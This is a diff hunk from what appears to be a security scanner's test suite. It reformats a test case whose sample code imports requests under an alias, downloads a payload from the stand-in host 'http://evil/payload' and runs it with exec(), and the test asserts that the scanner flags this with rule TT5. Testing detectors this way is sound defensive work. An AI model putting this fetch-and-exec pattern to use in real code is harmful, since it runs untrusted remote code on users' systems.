@@ -358,11 +358,7 @@ class TestImportAliasEvasion:
         assert any(f.rule_id == "TT3" for f in findings)
 
     def test_aliased_network_input_to_exec(self):
-        code = (
-            "import requests as r\n"
-            'code = r.get("http://evil/payload").text\n'
-            "exec(code)\n"
-        )
+        code = 'import requests as r\ncode = r.get("http://evil/payload").text\nexec(code)\n'
         findings = _run(code)
         assert any(f.rule_id == "TT5" for f in findings)
 
